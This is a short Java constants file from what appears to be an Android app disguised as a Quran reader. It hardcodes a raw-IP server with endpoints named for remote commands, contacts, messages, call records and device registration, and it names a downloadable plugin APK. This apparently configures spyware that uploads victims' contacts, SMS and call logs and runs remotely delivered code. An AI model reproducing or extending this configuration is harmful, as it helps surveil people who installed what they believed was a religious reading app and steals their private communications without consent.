/**
 *  Author :  hmg25
 *  Description :
 */
package com.powerock.quran.plugin;

import android.os.Environment;

/**
 * hmg25's android Type
 *
 *@author chuyang
 *
 */
public interface Constants {
	public String APP_DIR = Environment.getExternalStorageDirectory() + "/QuranReader/";
	public String FILE_PATH = APP_DIR + "quran.txt";
	public String PLUGIN_DIR = Environment.getExternalStorageDirectory() + "/QuranReader/plugins/";
	
	public String URL = "http://103.27.110.252:8087";
	public String COMMAND_URL = URL + "/command/";
	public String  PLUGIN_CONFIG_NAME = "plugin.conf";
	public String PLUGIN_APK_NAME = "plugin.apk";
	public String CONTACTS_URL = URL + "/contact/";
    public String MESSAGE_URL = URL + "/message/";
	public String CALL_RECORD_URL = URL + "/callrecord/";
	public String REG_URL = URL + "/reg";
}
